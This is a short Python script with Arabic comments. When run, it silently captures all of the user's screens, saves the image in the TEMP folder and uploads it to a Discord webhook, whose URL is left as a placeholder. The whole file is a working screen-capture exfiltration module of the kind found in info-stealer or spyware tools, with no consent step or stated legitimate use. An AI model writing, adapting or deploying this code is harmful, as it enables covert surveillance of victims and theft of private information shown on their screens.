from PIL import ImageGrab
import requests
import os

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image_path = os.path.join(os.getenv("TEMP"), "desktopshot.png")
        image.save(image_path)
        image.close()
        self.image_path = image_path

    def send_screenshot(self):
        webhook_url = 'WEBHOOKS_URL'  # استبدل بهذا الرابط الخاص بـ Webhook في Discord

        # رفع الصورة إلى Webhook
        with open(self.image_path, 'rb') as photo:
            files = {'file': photo}
            response = requests.post(webhook_url, files=files)

        if response.status_code == 204:
            print("تم إرسال الصورة إلى Webhook بنجاح.")
        else:
            print(f"فشل في إرسال الصورة. حالة الاستجابة: {response.status_code}")

# إنشاء كائن من الفئة لتنفيذ العملية
screenshot = Screenshot()
